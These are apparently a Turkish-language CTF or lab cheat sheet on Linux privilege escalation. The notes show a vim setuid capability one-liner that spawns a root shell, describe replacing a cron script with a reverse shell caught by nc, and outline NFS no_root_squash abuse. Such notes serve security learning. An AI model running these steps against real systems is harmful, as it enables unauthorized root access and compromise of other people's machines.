Ayrıcalık Yükseltme Yetenekleri:

# getcap ile priv esc


```bash
getcap -r / 2>/dev/null
``` 
![image](https://github.com/user-attachments/assets/41681c69-e0f1-4cfd-9b96-1fd99781a0b2)

daha sonra

![image](https://github.com/user-attachments/assets/f433e7ef-4b5a-422f-882e-b293290ead65)

Vim'in aşağıdaki komut ve yük ile kullanılabileceğini fark ediyoruz:
```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
![image](https://github.com/user-attachments/assets/fda3d99b-ff2c-431b-8742-920c643d51a0)

---

# Cronjobs ile priv esc

```bash
cat /etc/crontab
```
![image](https://github.com/user-attachments/assets/0b0a0f38-b9c8-4955-9df3-fb418ce0768a)
backup.sh'ı görebiliyoruz içindekileri silip reverse bash shellimizi koyuyorzu ve nc ile dinliyoruz cronjob çalıştığı zaman shell gelicektir

Eğer backup.sh executable değil ise yürütülebilir yapıp yürütmeliyiz.

![image](https://github.com/user-attachments/assets/3f5f374f-507a-4f6e-89c7-aedca770a237)
 

---

# NFS (Ağ Dosya Paylaşımı) yapılandırması /etc/exports dosyasında tutulur.
```bash
cat /etc/exports
```
![image](https://github.com/user-attachments/assets/c82d3b7f-06d5-41d1-bd36-5a4486cac6fd)

Saldıran makinemizden bağlanabilir paylaşımları sayarak başlayacağız.

```bash
showmount -e [hedef_ip]
```
![image](https://github.com/user-attachments/assets/196a0842-5170-4d3f-be99-1369d61cb9a1)

Saldıracağımız makineye “no_root_squash” paylaşımlarından birini bağlayıp çalıştırılabilir dosyamızı oluşturmaya başlayacağız.
tmp içinde olmalı


![image](https://github.com/user-attachments/assets/0944424d-1742-40d7-9a31-3415a11af785)


sonra 


![image](https://github.com/user-attachments/assets/95393a6b-8542-43de-b917-86ad585d9bd5)















